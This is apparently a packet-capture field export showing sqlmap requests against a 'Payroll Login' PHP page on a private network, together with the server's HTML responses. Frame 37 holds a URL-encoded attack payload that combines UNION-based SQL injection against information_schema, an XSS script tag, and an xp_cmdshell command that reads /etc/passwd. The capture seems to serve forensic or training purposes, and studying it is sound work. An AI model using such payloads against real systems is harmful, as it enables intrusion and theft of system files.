frame.number	ip.src	tcp.srcport	ip.dst	tcp.dstport	http.file_data	http.user_agent	http.request.full_uri
7	192.168.1.3	37828	192.168.2.2	80		sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
9	192.168.2.2	80	192.168.1.3	37828	\n<center>\n<form action="" method="post">\n<h2>Payroll Login</h2>\n<table style="border-radius: 25px; border: 2px solid black; padding: 20px;">\n    <tr>\n        <td>User</td>\n        <td><input type="text" name="user"></td>\n    </tr>\n    <tr>\n        <td>Password</td>\n        <td><input type="password" name="password"></td>\n    </tr>\n    <tr>\n       <td><input type="submit" value="OK" name="s">\n    </tr>\n</table>\n</form>\n</center>\n\n		
14	192.168.1.3	37826	192.168.2.2	80		sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
16	192.168.2.2	80	192.168.1.3	37826	\n<center>\n<form action="" method="post">\n<h2>Payroll Login</h2>\n<table style="border-radius: 25px; border: 2px solid black; padding: 20px;">\n    <tr>\n        <td>User</td>\n        <td><input type="text" name="user"></td>\n    </tr>\n    <tr>\n        <td>Password</td>\n        <td><input type="password" name="password"></td>\n    </tr>\n    <tr>\n       <td><input type="submit" value="OK" name="s">\n    </tr>\n</table>\n</form>\n</center>\n\n		
25	192.168.1.3	37830	192.168.2.2	80	user=EaKp&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
31	192.168.2.2	80	192.168.1.3	37830	\n\n<center><h2>Welcome, EaKp</h2><br><table style='border-radius: 25px; border: 2px solid black;' cellspacing=30><tr><th>Username</th><th>First Name</th><th>Last Name</th><th>Salary</th></tr></table></center>		
37	192.168.1.3	37832	192.168.2.2	80	user=EaKp&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php?bebQ=8781%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23
40	192.168.2.2	80	192.168.1.3	37832	\n\n<center><h2>Welcome, EaKp</h2><br><table style='border-radius: 25px; border: 2px solid black;' cellspacing=30><tr><th>Username</th><th>First Name</th><th>Last Name</th><th>Salary</th></tr></table></center>		
49	192.168.1.3	37834	192.168.2.2	80	user=EaKp&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
55	192.168.2.2	80	192.168.1.3	37834	\n\n<center><h2>Welcome, EaKp</h2><br><table style='border-radius: 25px; border: 2px solid black;' cellspacing=30><tr><th>Username</th><th>First Name</th><th>Last Name</th><th>Salary</th></tr></table></center>		
61	192.168.1.3	37836	192.168.2.2	80	user=4390&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
64	192.168.2.2	80	192.168.1.3	37836	\n\n<center><h2>Welcome, 4390</h2><br><table style='border-radius: 25px; border: 2px solid black;' cellspacing=30><tr><th>Username</th><th>First Name</th><th>Last Name</th><th>Salary</th></tr></table></center>		
